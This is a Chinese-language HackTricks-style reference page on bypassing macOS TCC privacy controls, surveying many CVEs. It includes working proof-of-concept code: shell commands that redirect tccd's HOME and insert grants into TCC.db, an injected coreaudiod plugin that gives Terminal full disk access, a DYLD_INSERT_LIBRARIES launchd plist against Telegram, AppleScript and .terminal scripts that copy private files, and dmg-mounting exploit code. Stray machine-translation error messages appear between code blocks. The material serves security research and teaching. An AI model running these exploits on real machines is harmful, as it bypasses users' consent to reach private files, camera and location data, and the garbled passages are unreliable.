# macOS TCC 绕过技术

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您希望在 **HackTricks 中看到您的公司广告** 或 **下载 HackTricks 的 PDF 版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 探索 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享您的黑客技巧**。

</details>

## 按功能分类

### 写入绕过

这不是一个绕过技术，它只是 TCC 的工作方式：**它不防止写入操作**。如果 Terminal **没有权限读取用户的桌面，它仍然可以写入其中**：
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
**扩展属性 `com.apple.macl`** 被添加到新的**文件**中，以授予**创建者应用程序**读取它的权限。

### SSH 绕过

默认情况下，通过 **SSH 访问曾经拥有“完全磁盘访问”权限**。为了禁用这一权限，你需要将其列出但禁用（从列表中移除并不会撤销这些权限）：

![](<../../../../../.gitbook/assets/image (569).png>)

在这里，你可以找到一些**恶意软件如何绕过这些保护**的例子：

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
请注意，现在要启用 SSH，你需要**完全磁盘访问**权限
{% endhint %}

### 处理扩展名 - CVE-2022-26767

属性 **`com.apple.macl`** 被赋予文件，以授予**某个应用程序读取它的权限**。当**拖放**文件到应用程序上，或当用户**双击**文件以用**默认应用程序**打开时，会设置此属性。

因此，用户可以**注册一个恶意应用程序**来处理所有扩展名，并调用 Launch Services 来**打开**任何文件（这样恶意文件将被授予读取权限）。

### iCloud

通过权限 **`com.apple.private.icloud-account-access`**，可以与 **`com.apple.iCloudHelper`** XPC 服务通信，它将**提供 iCloud 令牌**。

**iMovie** 和 **Garageband** 拥有此权限和其他允许的权限。

有关利用该权限**获取 icloud 令牌**的更多**信息**，请查看演讲：[**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=\_6e2LhmxVc0)

### kTCCServiceAppleEvents / 自动化

拥有 **`kTCCServiceAppleEvents`** 权限的应用程序将能够**控制其他应用程序**。这意味着它可能能够**滥用授予其他应用程序的权限**。

有关 Apple 脚本的更多信息，请查看：

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

例如，如果一个应用程序对 **`iTerm`** 拥有**自动化权限**，例如在这个例子中 **`Terminal`** 对 iTerm 有访问权限：

<figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### 通过 iTerm

Terminal，它没有 FDA，可以调用拥有 FDA 的 iTerm，并使用它来执行操作：

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
The provided text does not contain any content to translate. It appears to be a closing tag for a code block in markdown syntax. Please provide the relevant English text that needs to be translated into Chinese.
```bash
osascript iterm.script
```
#### 通过 Finder

如果一个应用程序可以通过 Finder 访问，它可以使用类似这样的脚本：
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## 根据应用行为

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

用户级别的 **tccd 守护进程** 使用 **`HOME`** 环境变量来访问 TCC 用户数据库：**`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

根据[这篇 Stack Exchange 帖子](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)，由于 TCC 守护进程是通过 `launchd` 在当前用户的域中运行的，因此可以**控制传递给它的所有环境变量**。\
因此，攻击者可以在 **`launchctl`** 中设置 **`$HOME`** 环境变量，使其指向一个**受控的** **目录**，**重启** **TCC** 守护进程，然后**直接修改 TCC 数据库**，以赋予自己**所有可用的 TCC 权限**，而无需提示最终用户。\
PoC：
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes 有权访问 TCC 保护的位置，但是当创建一个笔记时，它是在**非保护位置创建的**。因此，您可以要求 Notes 将受保护的文件复制到一个笔记中（所以在一个非保护的位置），然后访问该文件：

<figure><img src="../../../../../.gitbook/assets/image (6) (1) (3).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

二进制文件 `/usr/libexec/lsd` 和库 `libsecurity_translocate` 拥有 `com.apple.private.nullfs_allow` 权限，允许它创建**nullfs** 挂载，并拥有 `com.apple.private.tcc.allow` 权限，具有 **`kTCCServiceSystemPolicyAllFiles`** 来访问每个文件。

可以向 "Library" 添加隔离属性，调用 **`com.apple.security.translocation`** XPC 服务，然后它会将 Library 映射到 **`$TMPDIR/AppTranslocation/d/d/Library`**，在那里可以**访问** Library 内的所有文档。

### CVE-2023-38571 - Music & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** 有一个有趣的功能：当它运行时，它会将拖放到 **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** 的文件**导入**用户的“媒体库”。此外，它会调用类似：**`rename(a, b);`** 其中 `a` 和 `b` 是：

* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3"`

这个 **`rename(a, b);`** 行为容易受到**竞态条件**的影响，因为可以在 `Automatically Add to Music.localized` 文件夹中放置一个假的 **TCC.db** 文件，然后当新文件夹(b)创建以复制文件时，删除它，并将其指向 **`~/Library/Application Support/com.apple.TCC`**/。

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

如果 **`SQLITE_SQLLOG_DIR="path/folder"`** 基本上意味着**任何打开的数据库都会被复制到那个路径**。在这个 CVE 中，这个控制被滥用来**写入**一个将由拥有 FDA 的进程打开的 TCC 数据库中的**SQLite 数据库**，然后滥用 **`SQLITE_SQLLOG_DIR`** 和文件名中的**符号链接**，所以当那个数据库**打开**时，用户的 **TCC.db 被覆盖**为打开的那个。\
**更多信息** [**在写作中**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **和**[ **在讲话中**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s).

### **SQLITE\_AUTO\_TRACE**

如果设置了环境变量 **`SQLITE_AUTO_TRACE`**，库 **`libsqlite3.dylib`** 将开始**记录**所有 SQL 查询。许多应用程序使用了这个库，因此可以记录它们所有的 SQLite 查询。

若干苹果应用程序使用这个库来访问 TCC 保护的信息。
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407

此**环境变量由 `Metal` 框架使用**，它是多个程序的依赖，尤其是具有FDA的 `Music`。

设置以下内容：`MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`。如果 `path` 是一个有效目录，漏洞将触发，我们可以使用 `fs_usage` 来查看程序中发生了什么：

* 一个名为 `path/.dat.nosyncXXXX.XXXXXX`（X 是随机的）的文件将被 `open()`，
* 一个或多个 `write()` 将内容写入文件（我们无法控制这一点），
* `path/.dat.nosyncXXXX.XXXXXX` 将被 `renamed()` 为 `path/name`。

这是一个临时文件写入，随后是一个**`rename(old, new)`** **这不安全。**

它不安全，因为它必须**分别解析旧路径和新路径**，这可能需要一些时间，并且可能容易受到竞争条件的影响。更多信息可以查看 `xnu` 函数 `renameat_internal()`。

{% hint style="danger" %}
所以，基本上，如果一个拥有特权的进程正在重命名一个你控制的文件夹，你可以赢得一个 RCE 并使其访问不同的文件，或者像在这个 CVE 中，打开特权应用创建的文件并存储一个 FD。

如果重命名访问了你控制的文件夹，而你已经修改了源文件或拥有一个 FD，你可以将目标文件（或文件夹）更改为指向一个符号链接，这样你就可以随意写入。
{% endhint %}

这是 CVE 中的攻击：例如，为了覆盖用户的 `TCC.db`，我们可以：

* 创建 `/Users/hacker/ourlink` 指向 `/Users/hacker/Library/Application Support/com.apple.TCC/`
* 创建目录 `/Users/hacker/tmp/`
* 设置 `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
* 通过运行带有此环境变量的 `Music` 触发漏洞
* 捕获 `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` 的 `open()`（X 是随机的）
* 在这里我们也为写入 `open()` 这个文件，并保持文件描述符
* 在循环中原子性地将 `/Users/hacker/tmp` 与 `/Users/hacker/ourlink` 切换
* 我们这样做是为了最大化成功的机会，因为竞争窗口非常短，但是失去竞争几乎没有缺点
* 稍等片刻
* 测试我们是否幸运
* 如果没有，从头开始再来

更多信息在 [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

{% hint style="danger" %}
现在，如果你尝试使用环境变量 `MTL_DUMP_PIPELINES_TO_JSON_FILE` 应用程序将不会启动
{% endhint %}

### Apple Remote Desktop

作为 root，你可以启用此服务，**ARD 代理将拥有完整的磁盘访问权限**，然后可以被用户滥用，使其复制新的**TCC 用户数据库**。

## 通过 **NFSHomeDirectory**

TCC 在用户的 HOME 文件夹中使用一个数据库来控制对用户特定资源的访问，在 **$HOME/Library/Application Support/com.apple.TCC/TCC.db**。\
因此，如果用户设法用指向**不同文件夹**的 $HOME 环境变量重启 TCC，用户可以在 **/Library/Application Support/com.apple.TCC/TCC.db** 中创建一个新的 TCC 数据库，并欺骗 TCC 授予任何应用程序任何 TCC 权限。

{% hint style="success" %}
请注意，Apple 使用存储在用户配置文件中的设置作为 **`NFSHomeDirectory`** 属性的**`$HOME`** 的值，所以如果你攻破了一个有权限修改这个值的应用程序（**`kTCCServiceSystemPolicySysAdminFiles`**），你可以用 TCC 绕过来**武器化**这个选项。
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**第一个 POC** 使用 [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) 和 [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) 来修改用户的 **HOME** 文件夹。

1. 获取目标应用的 _csreq_ blob。
2. 放置一个带有所需访问权限和 _csreq_ blob 的假 _TCC.db_ 文件。
3. 使用 [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) 导出用户的目录服务条目。
4. 修改目录服务条目以更改用户的家目录。
5. 使用 [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) 导入修改后的目录服务条目。
6. 停止用户的 _tccd_ 并重启进程。

第二个 POC 使用了 **`/usr/libexec/configd`**，它具有 `com.apple.private.tcc.allow` 的值 `kTCCServiceSystemPolicySysAdminFiles`。\
可以通过 **`configd`** 的 **`-t`** 选项，攻击者可以指定一个 **自定义 Bundle 来加载**。因此，这个漏洞 **替换了** 通过 **`dsexport`** 和 **`dsimport`** 方法更改用户家目录的 **`configd` 代码注入**。

更多信息请查看 [**原始报告**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## 通过进程注入

有不同的技术可以在进程中注入代码并滥用其 TCC 权限：

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

此外，最常见的绕过 TCC 的进程注入是通过 **插件（加载库）**。\
插件通常是以库或 plist 的形式存在的额外代码，将由主应用程序 **加载** 并在其上下文中执行。因此，如果主应用程序已经获得了对 TCC 受限文件的访问权限（通过授予的权限或权利），**自定义代码也将拥有它**。

### CVE-2020-27937 - Directory Utility

应用程序 `/System/Library/CoreServices/Applications/Directory Utility.app` 拥有权利 **`kTCCServiceSystemPolicySysAdminFiles`**，加载带有 **`.daplug`** 扩展名的插件，并且**没有硬化**运行时。

为了武器化这个 CVE，**`NFSHomeDirectory`** 被**更改**（滥用前述权利），以便能够**接管用户的 TCC 数据库**来绕过 TCC。

更多信息请查看 [**原始报告**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

二进制文件 **`/usr/sbin/coreaudiod`** 拥有权利 `com.apple.security.cs.disable-library-validation` 和 `com.apple.private.tcc.manager`。第一个**允许代码注入**，第二个给予它管理 TCC 的权限。

这个二进制文件允许从文件夹 `/Library/Audio/Plug-Ins/HAL` 加载 **第三方插件**。因此，可以**加载插件并滥用 TCC 权限**。
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
有关更多信息，请查看[**原始报告**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)。

### 设备抽象层 (DAL) 插件

通过 Core Media I/O 打开摄像头流的系统应用程序（具有 **`kTCCServiceCamera`** 的应用）会加载位于 `/Library/CoreMediaIO/Plug-Ins/DAL`（不受 SIP 限制）的**这些插件**。

只需在那里存储一个带有通用**构造函数**的库即可**注入代码**。

多个苹果应用程序对此存在漏洞。

### Firefox

Firefox 应用程序具有 `com.apple.security.cs.disable-library-validation` 和 `com.apple.security.cs.allow-dyld-environment-variables` 权限：
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
有关如何轻松利用此漏洞的更多信息，请[**查看原始报告**](https://wojciechregula.blog/post/how-to-rob-a-firefox/)。

### CVE-2020-10006

二进制文件 `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` 拥有 **`com.apple.private.tcc.allow`** 和 **`com.apple.security.get-task-allow`** 权限，这允许在进程中注入代码并使用 TCC 权限。

### CVE-2023-26818 - Telegram

Telegram 拥有 **`com.apple.security.cs.allow-dyld-environment-variables`** 和 **`com.apple.security.cs.disable-library-validation`** 权限，因此可以滥用它来**获取其权限**，例如使用摄像头录制。您可以在[**报告中找到有效载荷**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)。

请注意如何使用环境变量来加载库，创建了一个**自定义 plist** 来注入这个库，并使用 **`launchctl`** 来启动它：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## 通过 open 调用

即使在沙盒中也可以调用 **`open`**。

### 终端脚本

在技术人员使用的计算机中，通常会给终端 **完全磁盘访问权限 (FDA)**。并且可以使用它来调用 **`.terminal`** 脚本。

**`.terminal`** 脚本是像这样的 plist 文件，其中包含在 **`CommandString`** 键中要执行的命令：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
应用程序可以在如 /tmp 之类的位置编写一个终端脚本，并使用以下命令启动它：
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## 通过挂载

### CVE-2020-9771 - mount\_apfs TCC绕过和权限提升

**任何用户**（即使是非特权用户）都可以创建并挂载时间机器快照，并**访问该快照的所有文件**。
所需的**唯一权限**是应用程序（如`Terminal`）需要有**完全磁盘访问**（FDA）权限（`kTCCServiceSystemPolicyAllfiles`），这需要由管理员授权。
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

更详细的解释可以在[**原始报告中找到**](https://theevilbit.github.io/posts/cve_2020_9771/)**。**

### CVE-2021-1784 & CVE-2021-30808 - 在TCC文件上挂载

即使TCC数据库文件受到保护，也可以**在目录上挂载**一个新的TCC.db文件：

{% code overflow="wrap" %}
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
Since the provided text does not contain any English content to translate, there is no translation to provide. If you have specific English content that you would like translated into Chinese, please provide the text, and I will be happy to assist you.
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
查看[**原始报告**](https://theevilbit.github.io/posts/cve-2021-30808/)中的**完整漏洞利用**。

### asr

工具**`/usr/sbin/asr`**允许复制整个磁盘并将其挂载到另一个位置，绕过TCC保护。

### 位置服务

在**`/var/db/locationd/clients.plist`**中有第三个TCC数据库，用于指示允许**访问位置服务**的客户端。\
文件夹**`/var/db/locationd/`**没有受到DMG挂载的保护，因此可以挂载我们自己的plist。

## 通过启动应用程序

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## 通过grep

在多个场合，文件会在未受保护的位置存储敏感信息，如电子邮件、电话号码、消息等（这在苹果公司算是一个漏洞）。

<figure><img src="../../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

## 合成点击

这个方法现在不再有效，但[**过去是有效的**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**：**

<figure><img src="../../../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

另一种使用[**CoreGraphics事件**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf)的方法：

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

## 参考资料

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+种绕过macOS隐私机制的方法**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**击败TCC - 20+种新的绕过MacOS隐私机制的方法**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客攻击！</strong></summary>

支持HackTricks的其他方式：

* 如果您希望在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
